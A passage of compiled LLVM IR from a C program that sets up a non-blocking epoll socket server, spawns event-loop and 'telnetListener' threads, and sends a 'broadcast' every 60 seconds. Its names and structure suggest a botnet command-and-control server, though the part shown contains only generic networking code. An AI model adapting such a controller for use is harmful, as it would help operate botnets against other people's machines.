  %45 = load i8*, i8** %44, align 8
  %46 = call i32 @create_and_bind(i8* noundef %45)
  store volatile i32 %46, i32* @listenFD, align 4
  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = icmp eq i32 %47, -1
  br i1 %48, label %49, label %50

49:                                               ; preds = %40
  call void @abort() #12
  unreachable

50:                                               ; preds = %40
  %51 = load volatile i32, i32* @listenFD, align 4
  %52 = call i32 @make_socket_non_blocking(i32 noundef %51)
  store i32 %52, i32* %8, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  br i1 %54, label %55, label %56

55:                                               ; preds = %50
  call void @abort() #12
  unreachable

56:                                               ; preds = %50
  %57 = load volatile i32, i32* @listenFD, align 4
  %58 = call i32 @listen(i32 noundef %57, i32 noundef 4096) #11
  store i32 %58, i32* %8, align 4
  %59 = load i32, i32* %8, align 4
  %60 = icmp eq i32 %59, -1
  br i1 %60, label %61, label %62

61:                                               ; preds = %56
  call void @perror(i8* noundef getelementptr inbounds ([7 x i8], [7 x i8]* @.str.105, i64 0, i64 0))
  call void @abort() #12
  unreachable

62:                                               ; preds = %56
  %63 = call i32 @epoll_create1(i32 noundef 0) #11
  store volatile i32 %63, i32* @epollFD, align 4
  %64 = load volatile i32, i32* @epollFD, align 4
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %67

66:                                               ; preds = %62
  call void @perror(i8* noundef getelementptr inbounds ([13 x i8], [13 x i8]* @.str.106, i64 0, i64 0))
  call void @abort() #12
  unreachable

67:                                               ; preds = %62
  %68 = load volatile i32, i32* @listenFD, align 4
  %69 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %70 = bitcast %union.epoll_data* %69 to i32*
  store i32 %68, i32* %70, align 1
  %71 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %71, align 1
  %72 = load volatile i32, i32* @epollFD, align 4
  %73 = load volatile i32, i32* @listenFD, align 4
  %74 = call i32 @epoll_ctl(i32 noundef %72, i32 noundef 1, i32 noundef %73, %struct.epoll_event* noundef %11) #11
  store i32 %74, i32* %8, align 4
  %75 = load i32, i32* %8, align 4
  %76 = icmp eq i32 %75, -1
  br i1 %76, label %77, label %78

77:                                               ; preds = %67
  call void @perror(i8* noundef getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  call void @abort() #12
  unreachable

78:                                               ; preds = %67
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 2
  %81 = zext i32 %80 to i64
  %82 = call i8* @llvm.stacksave()
  store i8* %82, i8** %14, align 8
  %83 = alloca i64, i64 %81, align 16
  store i64 %81, i64* %15, align 8
  br label %84

84:                                               ; preds = %88, %78
  %85 = load i32, i32* %9, align 4
  %86 = add nsw i32 %85, -1
  store i32 %86, i32* %9, align 4
  %87 = icmp ne i32 %85, 0
  br i1 %87, label %88, label %94

88:                                               ; preds = %84
  %89 = load i32, i32* %9, align 4
  %90 = add nsw i32 %89, 1
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i64, i64* %83, i64 %91
  %93 = call i32 @pthread_create(i64* noundef %92, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef @epollEventLoop, i8* noundef null) #11
  br label %84, !llvm.loop !29

94:                                               ; preds = %84
  %95 = getelementptr inbounds i64, i64* %83, i64 0
  %96 = load i32, i32* %10, align 4
  %97 = sext i32 %96 to i64
  %98 = inttoptr i64 %97 to i8*
  %99 = call i32 @pthread_create(i64* noundef %95, %union.pthread_attr_t* noundef null, i8* (i8*)* noundef bitcast (i8* (i32)* @telnetListener to i8* (i8*)*), i8* noundef %98) #11
  br label %100

100:                                              ; preds = %101, %94
  br label %101

101:                                              ; preds = %100
  call void @broadcast(i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 noundef -1, i8* noundef getelementptr inbounds ([5 x i8], [5 x i8]* @.str.107, i64 0, i64 0))
  %102 = call i32 @sleep(i32 noundef 60)
  br label %100
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32 noundef, void (i32)* noundef) #4

; Function Attrs: noreturn nounwind
declare void @exit(i32 noundef) #7

; Function Attrs: noinline nounwind sspstrong uwtable
define internal i32 @create_and_bind(i8* noundef %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* noundef null, i8* noundef %14, %struct.addrinfo* noundef %4, %struct.addrinfo** noundef %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 noundef %20) #11
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %19, i8* noundef getelementptr inbounds ([17 x i8], [17 x i8]* @.str.109, i64 0, i64 0), i8* noundef %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
  %35 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %36 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %35, i32 0, i32 3
  %37 = load i32, i32* %36, align 4
  %38 = call i32 @socket(i32 noundef %31, i32 noundef %34, i32 noundef %37) #11
  store i32 %38, i32* %8, align 4
  %39 = load i32, i32* %8, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %42

41:                                               ; preds = %28
  br label %63

42:                                               ; preds = %28
  store i32 1, i32* %9, align 4
  %43 = load i32, i32* %8, align 4
  %44 = bitcast i32* %9 to i8*
  %45 = call i32 @setsockopt(i32 noundef %43, i32 noundef 1, i32 noundef 2, i8* noundef %44, i32 noundef 4) #11
  %46 = icmp eq i32 %45, -1
  br i1 %46, label %47, label %48

47:                                               ; preds = %42
  call void @perror(i8* noundef getelementptr inbounds ([11 x i8], [11 x i8]* @.str.110, i64 0, i64 0))
  br label %48

48:                                               ; preds = %47, %42
  %49 = load i32, i32* %8, align 4
  %50 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %51 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %50, i32 0, i32 5
  %52 = load %struct.sockaddr*, %struct.sockaddr** %51, align 8
  %53 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %54 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %53, i32 0, i32 4
  %55 = load i32, i32* %54, align 8
  %56 = call i32 @bind(i32 noundef %49, %struct.sockaddr* noundef %52, i32 noundef %55) #11
  store i32 %56, i32* %7, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp eq i32 %57, 0
  br i1 %58, label %59, label %60

59:                                               ; preds = %48
  br label %67

60:                                               ; preds = %48
  %61 = load i32, i32* %8, align 4
  %62 = call i32 @close(i32 noundef %61)
  br label %63

63:                                               ; preds = %60, %41
  %64 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %65 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %64, i32 0, i32 7
  %66 = load %struct.addrinfo*, %struct.addrinfo** %65, align 8
  store %struct.addrinfo* %66, %struct.addrinfo** %6, align 8
  br label %25, !llvm.loop !30

67:                                               ; preds = %59, %25
  %68 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %69 = icmp eq %struct.addrinfo* %68, null
  br i1 %69, label %70, label %73

70:                                               ; preds = %67
  %71 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %72 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* noundef %71, i8* noundef getelementptr inbounds ([16 x i8], [16 x i8]* @.str.111, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %76

73:                                               ; preds = %67
  %74 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  call void @freeaddrinfo(%struct.addrinfo* noundef %74) #11
  %75 = load i32, i32* %8, align 4
  store i32 %75, i32* %2, align 4
  br label %76

76:                                               ; preds = %73, %70, %18
  %77 = load i32, i32* %2, align 4
  ret i32 %77
}

; Function Attrs: noreturn nounwind
declare void @abort() #7

; Function Attrs: nounwind
declare i32 @epoll_create1(i32 noundef) #4

; Function Attrs: nofree nosync nounwind willreturn
declare i8* @llvm.stacksave() #8

declare i32 @getaddrinfo(i8* noundef, i8* noundef, %struct.addrinfo* noundef, %struct.addrinfo** noundef) #1

; Function Attrs: nounwind
declare i8* @gai_strerror(i32 noundef) #4

; Function Attrs: nounwind
declare i32 @setsockopt(i32 noundef, i32 noundef, i32 noundef, i8* noundef, i32 noundef) #4

; Function Attrs: nounwind
declare void @freeaddrinfo(%struct.addrinfo* noundef) #4

attributes #0 = { noinline nounwind sspstrong uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #1 = { "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #2 = { nounwind readonly willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #3 = { nounwind readnone willreturn "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #4 = { nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #5 = { argmemonly nofree nounwind willreturn writeonly }
attributes #6 = { argmemonly nofree nounwind willreturn }
attributes #7 = { noreturn nounwind "frame-pointer"="all" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }
attributes #8 = { nofree nosync nounwind willreturn }
attributes #9 = { nounwind readonly willreturn }
attributes #10 = { nounwind readnone willreturn }
attributes #11 = { nounwind }
attributes #12 = { noreturn nounwind }

!llvm.ident = !{!0, !0, !0, !0, !0, !0}
!llvm.module.flags = !{!1, !2, !3, !4, !5}

!0 = !{!"clang version 14.0.6"}
!1 = !{i32 1, !"wchar_size", i32 4}
!2 = !{i32 7, !"PIC Level", i32 2}
!3 = !{i32 7, !"PIE Level", i32 2}
!4 = !{i32 7, !"uwtable", i32 1}
!5 = !{i32 7, !"frame-pointer", i32 2}
!6 = distinct !{!6, !7}
!7 = !{!"llvm.loop.mustprogress"}
!8 = distinct !{!8, !7}
!9 = distinct !{!9, !7}
!10 = distinct !{!10, !7}
!11 = distinct !{!11, !7}
!12 = distinct !{!12, !7}
!13 = distinct !{!13, !7}
!14 = distinct !{!14, !7}
!15 = distinct !{!15, !7}
!16 = distinct !{!16, !7}
!17 = distinct !{!17, !7}
!18 = distinct !{!18, !7}
!19 = distinct !{!19, !7}
!20 = distinct !{!20, !7}
!21 = distinct !{!21, !7}
!22 = distinct !{!22, !7}
!23 = distinct !{!23, !7}
!24 = distinct !{!24, !7}
!25 = distinct !{!25, !7}
!26 = distinct !{!26, !7}
!27 = distinct !{!27, !7}
!28 = distinct !{!28, !7}
!29 = distinct !{!29, !7}
!30 = distinct !{!30, !7}
